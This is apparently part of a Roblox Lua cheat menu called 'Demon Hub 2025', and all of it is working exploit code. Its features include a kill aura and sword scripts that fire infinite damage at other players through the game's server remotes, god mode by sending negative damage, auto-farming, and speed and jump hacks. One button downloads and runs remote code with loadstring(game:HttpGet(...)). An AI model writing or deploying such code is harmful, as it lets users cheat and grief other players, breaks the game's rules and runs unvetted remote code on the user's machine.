-- This new section waits for the UI to be created, then finds the main frame and makes it draggable.
task.spawn(function()
    task.wait(1.5) -- Wait a moment for the UI to fully render
    local PlayerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
    local mainFrame = nil

    -- Find the title label, which is a reliable way to locate the draggable frame
    for _, obj in ipairs(PlayerGui:GetDescendants()) do
        if obj:IsA("TextLabel") and obj.Text == "Demon Hub 2025" then
            if obj.Parent and obj.Parent:IsA("Frame") then
                mainFrame = obj.Parent -- The draggable frame is the parent of the title
                break
            end
        end
    end

    if mainFrame then
        EnableMobileDrag(mainFrame)
    else
        warn("Demon Hub Error: Could not find the main UI frame to enable mobile drag.")
    end
end)


-- === MAIN TAB ===
local MainSection = MainTab:NewSection("Main Features")
MainTab:NewButton("Infinite Yield", function()
    pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source", true))() end)
end)

local FarmSection = MainTab:NewSection("Farming")
MainTab:NewButton("Slow Farm", function()
    _G.farm = true
    task.spawn(function() while _G.farm do fireSword(4); task.wait() end end)
end)
MainTab:NewButton("Stop Slow Farm", function() _G.farm = false end)
MainTab:NewButton("Fast Farm", function()
    _G.active = true
    if not _G.fastFarmConnection then
        _G.fastFarmConnection = game:GetService("RunService").Stepped:Connect(function() if _G.active then fireSword(5) end end)
    end
end)
MainTab:NewButton("Stop Fast Farm", function() _G.active = false end)

local CombatSection = MainTab:NewSection("Combat")
MainTab:NewButton("Kill Aura", function()
    local Players, RunService, UserInputService = game:GetService("Players"), game:GetService("RunService"), game:GetService("UserInputService")
    local player = Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local backpack = player:WaitForChild("Backpack")
    local killAuraActive = true
    local activeSword, dmgRemote = nil, nil

    local function findValidSword(container)
        for _, tool in pairs(container:GetChildren()) do
            if tool:IsA("Tool") and tool:FindFirstChild("Handle") and tool.Handle:FindFirstChild("dmg") then return tool end
        end
    end

    local function setupSword()
        local sword = findValidSword(backpack) or findValidSword(character)
        if sword then
            sword.Parent, sword.Handle.Massless, sword.Handle.CanCollide = backpack, true, true
            task.wait(0.2)
            sword.Parent = character
            activeSword, dmgRemote = sword, sword.Handle.dmg:FindFirstChild("RemoteEvent")
        end
    end

    setupSword()

    RunService.RenderStepped:Connect(function()
        if not killAuraActive or not activeSword or not dmgRemote then return end
        local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        for _, target in ipairs(Players:GetPlayers()) do
            if target ~= player and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                if (hrp.Position - target.Character.HumanoidRootPart.Position).Magnitude <= range then
                    if target.Character:FindFirstChild("Humanoid") then
                        dmgRemote:FireServer(target.Character.Humanoid, math.huge)
                    end
                end
            end
        end
    end)

    UserInputService.InputBegan:Connect(function(input, gp)
        if gp then return end
        if input.KeyCode == Enum.KeyCode.E then killAuraActive = not killAuraActive end
    end)
end)

-- SLIDER FIX V3: Improved logic with a separate label for clear value display.
local killAuraRangeLabel = MainTab:NewLabel("Kill Aura Range: 40")
MainTab:NewSlider("", "", true, "", {min = 0, max = 1000, default = 40}, function(value)
    range = value
    killAuraRangeLabel:SetText("Kill Aura Range: " .. tostring(math.floor(value)))
end)

MainTab:NewButton("Sword Damage Script", function()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local function findSwords(container)
        local found = {}
        for _, tool in pairs(container:GetChildren()) do if tool:IsA("Tool") then table.insert(found, tool) end end
        return found
    end
    local swords = {}
    for _, sword in pairs(findSwords(player.Backpack)) do table.insert(swords, sword) end
    for _, sword in pairs(findSwords(character)) do table.insert(swords, sword) end
    for _, sword in pairs(swords) do
        if sword:FindFirstChild("Handle") then
            sword.Parent, sword.Handle.Massless, sword.Handle.CanCollide = player.Backpack, true, true
            sword.Parent = character
            sword.Handle.Touched:Connect(function(hit)
                local targetHumanoid = hit.Parent and hit.Parent:FindFirstChild("Humanoid")
                if targetHumanoid and hit.Parent.Name ~= player.Name then
                    local dmg = sword.Handle:FindFirstChild("dmg")
                    if dmg and dmg:FindFirstChild("RemoteEvent") then
                        dmg.RemoteEvent:FireServer(targetHumanoid, math.huge)
                    end
                end
            end)
        end
    end
end)

-- === CHARACTER TAB ===
local CharSection = CharacterTab:NewSection("Character Modifiers")
local localPlayer = game:GetService("Players").LocalPlayer

-- SLIDER FIX V3: Label updates and default value is applied on script start for synchronization.
local walkspeedLabel = CharacterTab:NewLabel("Walkspeed: 16")
CharacterTab:NewSlider("", "", true, "", {min = 0, max = 1000, default = 16}, function(speed)
    if localPlayer.Character and localPlayer.Character:FindFirstChild("Humanoid") then
        localPlayer.Character.Humanoid.WalkSpeed = speed
    end
    walkspeedLabel:SetText("Walkspeed: " .. tostring(math.floor(speed)))
end)

-- SLIDER FIX V3: Label updates and default value is applied on script start for synchronization.
local jumpPowerLabel = CharacterTab:NewLabel("Jump Power: 50")
CharacterTab:NewSlider("", "", true, "", {min = 0, max = 1000, default = 50}, function(jump)
    if localPlayer.Character and localPlayer.Character:FindFirstChild("Humanoid") then
        localPlayer.Character.Humanoid.JumpPower = jump
    end
    jumpPowerLabel:SetText("Jump Power: " .. tostring(math.floor(jump)))
end)

-- This function ensures character stats match the slider defaults when the script loads.
local function syncCharacterStats()
    local char = localPlayer.Character or localPlayer.CharacterAdded:Wait()
    local humanoid = char:WaitForChild("Humanoid")
    if humanoid then
        humanoid.WalkSpeed = 16
        humanoid.JumpPower = 50
    end
end
syncCharacterStats() -- Call it once to sync.
localPlayer.CharacterAdded:Connect(syncCharacterStats) -- Re-sync if the player respawns.


local HealthSection = CharacterTab:NewSection("Health & God Mode")
CharacterTab:NewButton("Force Respawn", function()
    local plr = game.Players.LocalPlayer
    local character = plr.Character
    if character and character:FindFirstChild("HumanoidRootPart") and character:FindFirstChild("Humanoid") then
        local pos, humanoid = character.HumanoidRootPart.CFrame, character.Humanoid
        local clone = humanoid:Clone()
        humanoid:Destroy()
        clone.Parent, clone.Health = character, 0
        task.wait(0.6)
        character:Destroy()
        local newChar = plr.CharacterAdded:Wait()
        if newChar and newChar:FindFirstChild("HumanoidRootPart") then newChar.HumanoidRootPart.CFrame = pos end
    end
end)
CharacterTab:NewButton("Instant GodMode", function()
    local plr = game.Players.LocalPlayer
    local humanoid = plr.Character and plr.Character:FindFirstChild("Humanoid")
    if humanoid then
        local sword = plr.Backpack:FindFirstChild("sword") or (plr.Character and plr.Character:FindFirstChild("sword"))
        if sword and sword:FindFirstChild("Handle") and sword.Handle:FindFirstChild("dmg") and sword.Handle.dmg:FindFirstChild("RemoteEvent") then
            sword.Handle.dmg.RemoteEvent:FireServer(humanoid, -math.huge)
        end
    end
end)
CharacterTab:NewToggle("Perma GodMode", false, function(value)
    _G.permaGodActive = value
    task.spawn(function()
        while _G.permaGodActive do
            local plr = game.Players.LocalPlayer
            local tool = plr.Backpack:FindFirstChild("sword") or (plr.Character and plr.Character:FindFirstChild("sword"))
            if tool and tool:FindFirstChild("Handle") and tool.Handle:FindFirstChild("dmg") and tool.Handle.dmg:FindFirstChild("RemoteEvent") and plr.Character and plr.Character:FindFirstChild("Humanoid") then
                tool.Handle.dmg.RemoteEvent:FireServer(plr.Character.Humanoid, -math.huge)
            end
            task.wait(0)
        end
    end)
end)

-- === EFFECTS TAB ===
local SingleColorSection = EffectsTab:NewSection("Single & Multi Color Effects")
local CONFIG = { FLAME_DELAY = 0, TOOL_SPAWN_DELAY = 0.10, EFFECT_REPEAT = 25, COLOR_REPEAT = 20 }
local function safeWait(duration) local start = tick() while tick() - start < duration do game:GetService("RunService").Heartbeat:Wait() end end
local function applyFlameColors(colors)
    local event = workspace:FindFirstChild("eff") and workspace.eff:FindFirstChild("RemoteEvent")
    if not event then return end
    for _ = 1, CONFIG.COLOR_REPEAT do for _, color in ipairs(colors) do event:FireServer(color) end end
end
local function spawnAndDropTools()
    local player = game.Players.LocalPlayer
    if not player or not player.Character then return end
    local loadRemote = workspace:FindFirstChild("load") and workspace.load:FindFirstChild("RemoteEvent")
    if loadRemote then loadRemote:FireServer() end
    safeWait(CONFIG.TOOL_SPAWN_DELAY)
    for _, tool in pairs(player.Backpack:GetChildren()) do if tool:IsA("Tool") then tool.Parent = player.Character end end
    for _, tool in pairs(player.Character:GetChildren()) do
        if tool:IsA("Tool") then tool.Parent, Instance.new("Script", tool).Name = workspace, "MineYesMine" end
    end
end
local function cleanUpTags() for _, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do if tool:FindFirstChild("MineYesMine") then tool.MineYesMine:Destroy() end end end
local function createFlameButton(label, colors)
    EffectsTab:NewButton(label, function()
        for _ = 1, CONFIG.EFFECT_REPEAT do applyFlameColors(colors); safeWait(CONFIG.FLAME_DELAY); spawnAndDropTools(); safeWait(CONFIG.FLAME_DELAY) end
        cleanUpTags()
    end)
end
createFlameButton("Sword: Purple", {"Purple"})
createFlameButton("Sword: Red", {"Red"})
createFlameButton("Sword: Black", {"Black"})
createFlameButton("Sword: Blue", {"Blue"})
